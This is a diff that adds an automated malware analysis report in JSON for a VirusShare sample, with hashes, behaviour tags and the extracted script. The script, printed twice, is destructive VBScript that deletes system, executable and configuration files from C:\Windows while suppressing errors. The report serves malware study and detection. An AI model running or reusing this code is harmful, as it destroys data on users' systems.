@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "Dim ObjShell, AFile, Thefiles\nSet FSo = Wscript.CreateObject(\"Scripting.FileSystemObject\")\nset Afolder=FSO.GetFolder(\"C:\\Windows\")\nSet TheFiles = AFolder.Files\n\nOn Error Resume Next\n\nFor Each AFile In TheFiles\nIf UCase(FSO.GetExtensionName(AFile.Path)) = \"SYS\"or\"COM\"or\"DLL\"Or\"BAT\"OR\"EXE\"or\"INI\" Then\nAFile.Delete\nEnd If\nNext"
+    },
+    "filename": "VirusShare_e0ac067480623728e38aece1429819fc",
+    "filesize": 336,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "e0ac067480623728e38aece1429819fc",
+        "sha1": "838fa8aa06ca53140003143aa8dce976228a94ba",
+        "sha256": "f2dae175c9ed5a2fff342d64c02fd3f2db3ee7e0ba7f36c86a0e6180d6fa22fa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim ObjShell, AFile, Thefiles",
+            "Set FSo = Wscript.CreateObject(\"Scripting.FileSystemObject\")",
+            "set Afolder=FSO.GetFolder(\"C:\\Windows\")",
+            "Set TheFiles = AFolder.Files",
+            "On Error Resume Next",
+            "For Each AFile In TheFiles",
+            "If UCase(FSO.GetExtensionName(AFile.Path)) = \"SYS\"or\"COM\"or\"DLL\"Or\"BAT\"OR\"EXE\"or\"INI\" Then",
+            "AFile.Delete",
+            "End If",
+            "Next"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.262415",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
